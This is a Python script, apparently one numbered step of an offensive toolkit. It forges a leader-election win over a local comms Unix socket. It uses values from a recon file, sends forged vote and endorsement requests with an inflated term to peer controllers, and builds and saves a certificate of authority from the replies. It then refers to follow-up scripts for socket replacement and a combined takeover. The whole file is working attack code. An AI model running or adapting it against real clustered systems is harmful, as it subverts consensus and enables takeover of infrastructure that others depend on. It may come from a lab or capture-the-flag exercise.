#!/usr/bin/env python3
"""
offense/03_win_election.py

Forces an election win by injecting vote and endorsement requests
through the local comms Unix socket. Defaults to values in
/tmp/recon.json so it can run without manual substitution.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gg_core  # noqa: E402


def collect_responses(sock: socket.socket, deadline: float):
    buf = b""
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            yield None
            continue
        if not chunk:
            return
        buf += chunk
        consumed = 0
        for line in gg_core.iter_ndjson(buf):
            consumed += len(line) + 1
            try:
                tx = gg_core.Transmission.from_json_bytes(line)
            except Exception:
                continue
            payload, _ = tx.decode_payload()
            yield (tx.msg_type, payload, tx.source)
        buf = buf[consumed:]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--recon", default=gg_core.DEFAULT_RECON_PATH)
    ap.add_argument("--term", type=int, default=99999)
    ap.add_argument("--vote-wait", type=int, default=15)
    ap.add_argument("--endorse-wait", type=int, default=15)
    ap.add_argument("--coa-out", default=gg_core.DEFAULT_COA_PATH)
    args = ap.parse_args()

    recon = gg_core.load_recon(args.recon)
    our_uuid = recon.get("our_uuid", "")
    comms_sock = recon.get("comms_socket", "")
    election_sock = recon.get("election_socket", "")
    peers = recon.get("peer_controllers", []) or []
    if not our_uuid or not comms_sock:
        print("[!] recon is missing our_uuid or comms_socket", file=sys.stderr)
        return 2

    total = len(peers) + 1
    quorum = total // 2 + 1
    print(f"Our UUID:          {our_uuid}")
    print(f"Peer controllers:  {len(peers)}")
    print(f"Total controllers: {total}")
    print(f"Quorum needed:     {quorum}")
    print(f"Term:              {args.term}")

    comms = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    comms.settimeout(2.0)
    try:
        comms.connect(comms_sock)
    except OSError as e:
        print(gg_core.format_socket_error(comms_sock, e, action="connect to"), file=sys.stderr)
        comms.close()
        return 2

    print("\n[*] Sending Vote Requests...")
    vote_payload = {"leader": our_uuid, "term": args.term}
    for peer in peers:
        uuid = peer.get("uuid", "")
        if not uuid:
            continue
        comms.sendall(gg_core.make_election_tx(our_uuid, uuid, gg_core.ELECTION_VOTE_REQUEST, vote_payload))
        print(f"  -> Vote Request -> {uuid[:8]}")

    print(f"\n[*] Awaiting vote responses for {args.vote_wait}s...")
    votes = 1
    endorsements: list[dict] = []
    deadline = time.time() + args.vote_wait
    for tick in collect_responses(comms, deadline):
        if tick is None:
            if votes >= quorum:
                break
            continue
        mt, payload, src = tick
        if mt == gg_core.ELECTION_VOTE_RESPONSE and isinstance(payload, dict):
            granted = bool(payload.get("vote_granted"))
            term = payload.get("term", -1)
            print(f"  <- Vote Response from {src[:8]} granted={granted} term={term}")
            if granted:
                votes += 1
        elif mt == gg_core.ELECTION_ENDORSE_RESPONSE and isinstance(payload, dict):
            e = payload.get("endorsement") or {}
            if e:
                endorsements.append(e)
                print(f"  <- (early) Endorsement from {e.get('endorser','?')[:8]}")

    print(f"\n[*] Vote tally: {votes} of {total} (need {quorum})")
    if votes < quorum:
        print("[!] QUORUM NOT REACHED. Aborting.")
        comms.close()
        return 1

    print("\n[*] Sending Endorsement Requests...")
    endorse_payload = {"term": args.term}
    for peer in peers:
        uuid = peer.get("uuid", "")
        if not uuid:
            continue
        comms.sendall(gg_core.make_election_tx(our_uuid, uuid, gg_core.ELECTION_ENDORSE_REQUEST, endorse_payload))
        print(f"  -> Endorsement Request -> {uuid[:8]}")

    print(f"\n[*] Awaiting endorsements for {args.endorse_wait}s...")
    deadline = time.time() + args.endorse_wait
    for tick in collect_responses(comms, deadline):
        if tick is None:
            if len(endorsements) >= quorum - 1:
                break
            continue
        mt, payload, _ = tick
        if mt == gg_core.ELECTION_ENDORSE_RESPONSE and isinstance(payload, dict):
            e = payload.get("endorsement") or {}
            if e:
                endorsements.append(e)
                print(f"  <- Endorsement from {e.get('endorser','?')[:8]}")

    comms.close()

    print(f"\n[*] Collected {len(endorsements)} endorsements")
    if not endorsements:
        print("[!] No endorsements. Cannot construct COA.")
        return 1

    coa = gg_core.Authority.from_dict({"endorsements": endorsements})
    gg_core.save_coa(coa, args.coa_out)
    print(f"[+] COA written to {args.coa_out}")

    if election_sock:
        print("\n[*] Checking real election socket...")
        try:
            live = gg_core.read_coa(election_sock)
            if not live.is_empty():
                print("[+] Real election daemon shows us as leader.")
                print("[+] No socket replacement required.")
            else:
                print("[-] Real election daemon still NOT leader.")
                print("[-] Run 04_replace_election_socket.py or 06_takeover_combined.py.")
        except OSError as e:
            print(f"[!] Could not query election socket: {e}")
    return 0


if __name__ == "__main__":
    sys.exit(gg_core.run_main(main))
